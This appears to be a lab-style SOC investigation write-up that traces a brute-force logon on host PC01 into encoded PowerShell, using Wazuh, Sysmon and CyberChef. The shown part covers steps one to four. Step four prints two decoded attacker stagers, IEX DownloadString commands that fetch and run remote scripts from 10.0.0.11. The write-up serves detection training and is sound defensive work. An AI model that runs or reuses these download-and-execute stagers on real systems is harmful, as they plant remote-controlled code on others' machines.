# 🔴 Alert Investigation — Brute Force to PowerShell C2 via Encoded Command

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-Alert%20Investigation-blue?style=flat)
![Attack](https://img.shields.io/badge/Attack-Brute%20Force%20%7C%20PowerShell%20C2%20%7C%20AMSI%20Bypass-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1110%20%7C%20T1059.001%20%7C%20T1027%20%7C%20T1105%20%7C%20T1071-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Wazuh%20%7C%20Sysmon%20%7C%20CyberChef-informational?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Case Title** | Brute Force to PowerShell C2 via Encoded Command |
| **Date** | November 17, 2025 |
| **Affected Host** | `PC01` |
| **Affected User** | `sarah` |
| **Attacker IPs** | `104.28.242.42` / `103.114.211.240` |
| **C2 Server** | `10.0.0.11` (ports 80, 8080, 4444) |
| **Severity** | 🔴 Critical |
| **Verdict** | ✅ True Positive — Full compromise confirmed: brute force → initial access → PowerShell C2 |

---

## 🎯 Scenario

A Wazuh alert triggered on `PC01` for a high volume of failed authentication events. What appeared to be a routine brute force attempt quickly escalated — the attacker successfully authenticated, then immediately executed an encoded PowerShell command that established a C2 channel and dropped additional payloads on disk.

This investigation traces the full kill chain from the first failed logon to an active reverse shell on port `4444`.

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Wazuh / Kibana** | SIEM — log aggregation, alert triage, event correlation |
| **Sysmon** | Endpoint telemetry — process creation, file events, network connections |
| **CyberChef** | Decode Base64 encoded PowerShell payloads |

---

## 🗂️ Artifacts

| Artifact | Description |
|---|---|
| Windows Event ID 4625 | Failed logon attempts — brute force source identification |
| Windows Event ID 4624 | Successful logon — initial access confirmation |
| Sysmon Event ID 1 | Process creation — PowerShell execution with encoded command |
| Sysmon Event ID 11 | File creation — PS1 payloads dropped to disk |
| Sysmon Event ID 3 | Network connection — C2 callback to `10.0.0.11` |
| Windows Event ID 4104 | PowerShell ScriptBlock logging — obfuscated AMSI bypass captured |

---

## 📚 Resources

| Resource | Link |
|---|---|
| MITRE T1110 — Brute Force | [attack.mitre.org](https://attack.mitre.org/techniques/T1110/) |
| MITRE T1059.001 — PowerShell | [attack.mitre.org](https://attack.mitre.org/techniques/T1059/001/) |
| MITRE T1027 — Obfuscated Files | [attack.mitre.org](https://attack.mitre.org/techniques/T1027/) |
| MITRE T1105 — Ingress Tool Transfer | [attack.mitre.org](https://attack.mitre.org/techniques/T1105/) |
| MITRE T1071 — Application Layer Protocol | [attack.mitre.org](https://attack.mitre.org/techniques/T1071/) |
| Sysmon Event ID Reference | [docs.microsoft.com](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) |


---

## 🔍 Investigation Methodology

```
Step 1 → Brute Force Detection     (Event ID 4625 — failed logons volume)
Step 2 → Initial Access Confirmed  (Event ID 4624 — successful logon)
Step 3 → PowerShell Execution      (Sysmon EID 1 — encoded command launched)
Step 4 → Payload Decode            (CyberChef — Base64 → IEX DownloadString)
Step 5 → File Drop                 (Sysmon EID 11 — PS1 files written to disk)
Step 6 → C2 Callback               (Sysmon EID 3 — outbound to 10.0.0.11:4444)
Step 7 → AMSI Bypass               (Event ID 4104 — obfuscated ScriptBlock logged)
```
---

## 🕵️ Investigation

### Step 1 — Brute Force Detection: 436 Failed Logons

The alert was triggered by a flood of **Windows Event ID 4625** (failed logon) events on `PC01`.

> <img width="1328" height="361" alt="0" src="https://github.com/user-attachments/assets/8b5eec51-c3d1-4232-afc0-c4bbee3e63be" />
> <img width="1336" height="280" alt="00" src="https://github.com/user-attachments/assets/d536b91a-a93e-47e9-8630-734202f4ba79" />


```
Event ID:    4625 (Failed Logon)
Source IP:   104.28.242.42
Target Host: PC01
Count:       436 attempts
Timeframe:   11:27:28 → 11:27:36 (< 1 minute)
```

> ### 🔎 Why Event ID 4625?
> EID 4625 is logged every time a Windows logon attempt fails. A single external IP generating 436 failures in under a minute against the same host is a textbook **credential brute force** pattern. The volume and speed rule out human error — this is automated.

---

### Step 2 — Initial Access Confirmed: Successful Logon

After the brute force, **Event ID 4624** (successful logon) was observed from the same attacker IP on `PC01`.

> <img width="1319" height="115" alt="001" src="https://github.com/user-attachments/assets/5c97ec91-da03-4bf6-9b22-ae134c1676d6" />

> <img width="1314" height="119" alt="01" src="https://github.com/user-attachments/assets/40f2918c-ded2-44ed-b760-b0a5f736b745" />
```
Event ID:    4624 (Successful Logon)
Source IPs:  104.28.242.42 / 103.114.211.240
Target Host: PC01
User:        sarah
Time:        11:20:34 / 11:22:57 / 11:26:26
```

> ### 🔎 Why Event ID 4624?
> EID 4624 confirms a successful authentication. Coming directly after 436 failed attempts from the same IP, this is **not a coincidence** — the brute force succeeded. The attacker now has valid credentials for user `sarah` on `PC01`.

---
## Step 3 — PowerShell Execution: Encoded Command

Immediately after access, **Sysmon Event ID 1** captured `PowerShell.exe` executing with a suspicious `-EncodedCommand` flag under user `sarah`.

> <img width="1331" height="152" alt="1" src="https://github.com/user-attachments/assets/69845bfa-fc22-4a51-b545-59a307dd98c5" />

```
Process:     C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe
User:        PC01\sarah
CommandLine: powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAt...
Time:        2025-11-17T11:21:33
```
> ### 🔎 Why Sysmon Event ID 1?
> Sysmon EID 1 logs every process creation including the full command line. The `-EncodedCommand` flag is a classic attacker technique to hide the real payload from plain-text log monitoring. Anything encoded needs to be decoded immediately — that's the next step.

---

### Step 4 — Payload Decoded: IEX DownloadString

The Base64 encoded command was decoded using **CyberChef** (From Base64 → Decode text UTF-16LE):

> <img width="1094" height="409" alt="2" src="https://github.com/user-attachments/assets/ee770492-be1b-4d64-ace6-8f0a2255a14a" />


```powershell
# First payload decoded:
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.11/haha.ps1')
```

A second encoded command was also captured and decoded:

>  <img width="1331" height="265" alt="4" src="https://github.com/user-attachments/assets/5412ee23-a2db-4d91-ac6d-f5b8d934352d" />

> <img width="1359" height="555" alt="5" src="https://github.com/user-attachments/assets/be563a97-526d-4061-b573-0ae6485d2a39" />



```powershell
# Second payload decoded:
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
$ja=new-object net.webclient;
if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){
  $ja.proxy=[Net.WebRequest]::GetSystemWebProxy();
  $ja.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
}
IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q/Z2oecggFq'));
IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q'));
```

> ### 🔎 Why IEX + DownloadString?
> `Invoke-Expression` + `DownloadString` is a **fileless execution** technique — the attacker downloads a script directly into memory and runs it without writing the main payload to disk. The TLS configuration in the second payload suggests a more sophisticated stager, likely a C2 framework implant (Metasploit/Cobalt Strike/Sliver pattern).

---
